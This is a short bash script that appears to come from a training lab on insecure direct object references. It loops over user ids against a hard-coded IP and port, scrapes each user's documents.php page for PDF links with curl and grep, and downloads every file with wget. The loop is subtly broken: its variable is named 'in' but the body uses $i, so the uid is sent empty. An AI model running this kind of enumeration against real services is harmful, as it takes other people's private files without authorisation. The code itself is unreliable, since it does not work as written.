#!/bin/bash

url="http://94.237.121.185:45229"

for in in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done